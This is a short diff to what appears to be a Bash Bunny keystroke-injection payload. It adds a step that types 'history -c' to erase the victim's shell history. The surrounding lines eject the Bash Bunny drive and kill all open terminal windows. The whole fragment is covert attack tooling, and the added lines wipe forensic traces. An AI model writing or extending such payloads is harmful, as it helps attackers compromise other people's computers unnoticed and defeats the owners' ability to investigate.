@@ -133,6 +133,9 @@ QUACK DELAY 1500
 QUACK STRING "diskutil eject \$(mount | grep -i BashBunny | cut -d ' ' -f 3)"
 QUACK ENTER
 QUACK DELAY 2000
+QUACK STRING "history -c"
+QUACK ENTER
+QUACK DELAY 500
 QUACK STRING "killall qterminal & killall gnome-terminal- & killall Terminal & killall xterm & killall konsole & killall lxterminal & killall urxvt & killall st & killall alacritty & killall xfce4-terminal & killall tilda"
 QUACK ENTER
 sync
